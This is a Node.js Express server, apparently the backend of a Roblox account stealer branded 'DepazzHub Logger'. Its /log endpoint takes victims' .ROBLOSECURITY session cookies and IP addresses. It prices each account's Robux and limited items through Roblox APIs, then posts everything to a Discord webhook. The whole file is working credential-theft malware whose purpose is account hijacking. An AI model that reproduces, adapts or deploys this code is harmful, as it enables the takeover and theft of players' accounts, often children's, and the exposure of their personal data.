const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());
app.set('trust proxy', true);

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

async function getAccountValue(userId) {
    try {
        const robuxRes = await axios.get(`https://economy.roblox.com/v2/users/${userId}/currency`);
        const robux = robuxRes.data.robux || 0;

        let rap = 0;
        try {
            const rapRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/inventory/collectibles?limit=100&sortOrder=Desc`);
            if (rapRes.data && rapRes.data.data) {
                rap = rapRes.data.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
            }
        } catch (e) {
            console.log("Inventory private error trying to get RAP.");
        }

        const total = robux + rap;

        return {
            robux: robux.toLocaleString('en-US'),
            rap: rap.toLocaleString('en-US'),
            total: total.toLocaleString('en-US')
        };
    } catch (error) {
        console.error("Error al calcular valor:", error.message);
        return { robux: "N/A", rap: "N/A", total: "N/A" };
    }
}

app.post('/log', async (req, res) => {
    try {
        const { username, displayName, userId, gameId, accountAge, region } = req.body;

        const robloxCookie = req.headers['cookie']?.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';

        const clientIP = req.ip || req.connection.remoteAddress || 'N/A';

        const accountValue = await getAccountValue(userId);

        const payload = {
            content: "🚀 **DepazzHub**",
            embeds: [{
                color: 3887359,
                fields: [
                    { name: "👤 Username", value: username || "Unknown", inline: true },
                    { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
                    { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true },

                    { name: "💵 Robux", value: `R$ ${accountValue.robux}`, inline: true },
                    { name: "💎 RAP (Limiteds)", value: `R$ ${accountValue.rap}`, inline: true },
                    { name: "💰 Total Value", value: `**R$ ${accountValue.total}**`, inline: true },

                    { 
                        name: "🍪 Cookie .ROBLOSECURITY", 
                        value: `\`${robloxCookie}\``, 
                        inline: false 
                    },

                    { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
                    { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
                    { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
                    { name: "🌐 Game ID", value: String(gameId || "N/A"), inline: false }
                ],
                footer: { text: "DepazzHub Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        await axios.post(DISCORD_WEBHOOK, payload);
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.get('/', (req, res) => {
    res.json({ 
        status: "API is running!",
        webhookConfigured: !!DISCORD_WEBHOOK
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
